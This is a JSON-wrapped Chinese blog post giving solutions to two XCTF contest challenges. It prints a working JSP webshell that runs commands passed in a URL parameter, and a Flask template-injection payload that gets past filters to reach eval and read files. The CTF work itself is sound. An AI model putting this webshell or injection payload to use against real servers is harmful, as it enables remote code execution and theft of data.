{"title":"XCTF全国高校主题挑战赛华为云专场","uid":"debcb1ad3dee8b8ef571d1cc227ee9b4","slug":"XCTF全国高校主题挑战赛华为云专场","date":"2020-12-25T13:11:39.000Z","updated":"2021-07-07T06:24:07.262Z","comments":true,"path":"api/articles/XCTF全国高校主题挑战赛华为云专场.json","keywords":"A1andNS","cover":null,"content":"<h2 id=\"webshell-1\"><a href=\"#webshell-1\" class=\"headerlink\" title=\"webshell_1\"></a><strong>webshell_1</strong></h2><p><strong>考点：webshell</strong></p>\n<p><strong>在首页上传一个jsp木马</strong></p>\n<p><strong>jsp内容为</strong></p>\n<p>&lt;%if(“a1andns”.equals(request.getParameter(“pwd”))){         java.io.InputStreamin=Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream();int a =-1;byte[] b =newbyte[2048];out.print(“<pre>\");while((a=in.read(b))!=-1){out.println(newString(b));}out.print(\"</pre>“);} %&gt;</p>\n<p>得到webshell位置为<a href=\"http://124.70.199.122:31203/upload/1ca84461-1291-4075-8e67-516f556b862e.jsp\">http://124.70.199.122:31203/upload/1ca84461-1291-4075-8e67-516f556b862e.jsp</a></p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;124.70.199.122:31203&#x2F;upload&#x2F;1ca84461-1291-4075-8e67-516f556b862e.jsp?pwd&#x3D;a1andns&amp;i&#x3D;cat &#x2F;flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"MINE1-1\"><a href=\"#MINE1-1\" class=\"headerlink\" title=\"MINE1_1\"></a><strong>MINE1_1</strong></h2><p><strong>考点：SSTI</strong></p>\n<p>利用点应该在<code>http://124.70.204.134:31079/success?msg=&#123;&#123;&#125;&#125;</code>,flask框架，但是有过滤，’’和_、[]、args、%都被过滤了，使用values接收GET数据，从而实现绕过。</p>\n<p>查看子类：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__ <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>最终payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;121.37.165.126:32568&#x2F;success?msg&#x3D;&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4)(233)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8)(request.values.x9)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;open(&quot;&#x2F;app&#x2F;flag.txt&quot;).read()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里主要是利用request的values来接收GET传入的数据，从而达到绕过过滤的目的。</p>\n","text":"webshell_1考点：webshell 在首页上传一个jsp木马 jsp内容为 &lt;%if(“a1andns”.equals(request.getParameter(“pwd”))){ java.io.InputStreamin=Runtime.getRuntime()...","link":"","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"XCTF","slug":"XCTF","count":1,"path":"api/tags/XCTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#webshell-1\"><span class=\"toc-text\">webshell_1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MINE1-1\"><span class=\"toc-text\">MINE1_1</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Redhat学习(六)","uid":"86329bd862265de73cba866bd39449ad","slug":"Redhat学习-六","date":"2020-12-26T14:17:49.000Z","updated":"2020-12-28T15:18:52.000Z","comments":true,"path":"api/articles/Redhat学习-六.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200601211235.jpg","text":"Linux远程管理中经常使用的SSH，也就是对应的sshd服务。 远程控制服务SSH（Secure Shell）是一种能够以安全的方式提供远程登录的协议，也是目前远程管理Linux系统的首选方式。在此之前，一般使用FTP或Telnet来进行远程登录。但是因为它们以明文的形式在网络...","link":"","photos":[],"count_time":{"symbolsCount":"5.2k","symbolsTime":"5 mins."},"categories":[{"name":"Linux学习","slug":"Linux学习","count":7,"path":"api/categories/Linux学习.json"}],"tags":[{"name":"Linux","slug":"Linux","count":11,"path":"api/tags/Linux.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Redhat学习(五)","uid":"c993bcceaa8ff4a9e60b7e8c86bd0c0e","slug":"Redhat学习-五","date":"2020-12-15T08:12:52.000Z","updated":"2020-12-16T13:47:08.000Z","comments":true,"path":"api/articles/Redhat学习-五.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200601211235.jpg","text":"来看看redhat的防火墙管理工具，基本的Linux都会使用的防火墙。这里Redhat 7 中新增了firewalld防火墙，之前版本中都是iptables，现在很多Linux也开始使用firewalld了。 防火墙管理工具所谓防火墙，就是用来隔绝内网和外网的，部署在内网和公网之...","link":"","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"Linux学习","slug":"Linux学习","count":7,"path":"api/categories/Linux学习.json"}],"tags":[{"name":"Linux","slug":"Linux","count":11,"path":"api/tags/Linux.json"},{"name":"Redhat","slug":"Redhat","count":5,"path":"api/tags/Redhat.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}